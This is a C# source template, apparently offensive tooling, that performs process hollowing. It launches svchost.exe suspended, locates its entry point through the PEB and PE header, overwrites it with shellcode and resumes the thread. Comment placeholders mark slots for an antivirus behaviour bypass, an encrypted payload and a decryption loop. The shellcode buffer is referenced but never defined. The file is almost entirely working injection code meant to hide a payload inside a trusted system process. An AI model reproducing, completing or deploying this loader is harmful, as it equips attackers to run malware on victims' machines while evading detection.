using System;
using System.Runtime.InteropServices;

namespace ProcessHollower
{
    class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int ProcessBasicInformation = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);
        // Pinvoke lines here
        

        static void Main(string[] args)
        {
            //Behaviour Bypass Here


            //Payload Here


            // Decryption Loop Here


            // Create the target process (e. g., svchost.exe) in a suspended state
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

            // Query created process to extract its base address pointer from PEB (Process Environment Block)
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, ProcessBasicInformation, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            // Pointer to the base address of the EXE image: BASE_ADDR_PTR = PEB_ADDR + 0x10
            IntPtr ptrImageBaseAddress = (IntPtr)((Int64)bi.PebAddress + 0x10);

            // Read 8 bytes of memory (IntPtr.Size is 8 bytes for x64) pointed by the image base address pointer (ptrImageBaseAddress) in order to get the actual value of the image base address
            byte[] baseAddressBytes = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrImageBaseAddress, baseAddressBytes, baseAddressBytes.Length, out nRead);
            // We're got bytes as a result of memory read, then converted them to Int64 and casted to IntPtr
            IntPtr imageBaseAddress = (IntPtr)(BitConverter.ToInt64(baseAddressBytes, 0));

            // Read 200 bytes of the loaded EXE image and parse PE structure to get the EntryPoint address
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, imageBaseAddress, data, data.Length, out nRead);
            // "e_lfanew" field (4 bytes, UInt32; contains the offset for the PE header): e_lfanew = BASE_ADDR + 0x3C
            uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
            // EntryPoint RVA (Relative Virtual Address) offset: ENTRYPOINT_RVA_OFFSET = e_lfanew + 0x28
            uint entrypointRvaOffset = e_lfanew + 0x28;
            // EntryPoint RVA (4 bytes, UInt32; contains the offset for the executable EntryPoint address): ENTRYPOINT_RVA = BASE_ADDR + ENTRYPOINT_RVA_OFFSET
            uint entrypointRva = BitConverter.ToUInt32(data, (int)entrypointRvaOffset);
            // Absolute address of the executable EntryPoint: ENTRYPOINT_ADDR = BASE_ADDR + ENTRYPOINT_RVA
            IntPtr entrypointAddress = (IntPtr)((UInt64)imageBaseAddress + entrypointRva);

            // Write the shellcode to the EntryPoint address and resume thread execution
            WriteProcessMemory(hProcess, entrypointAddress, buf, buf.Length, out nRead);
            ResumeThread(pi.hThread);
        }
    }
}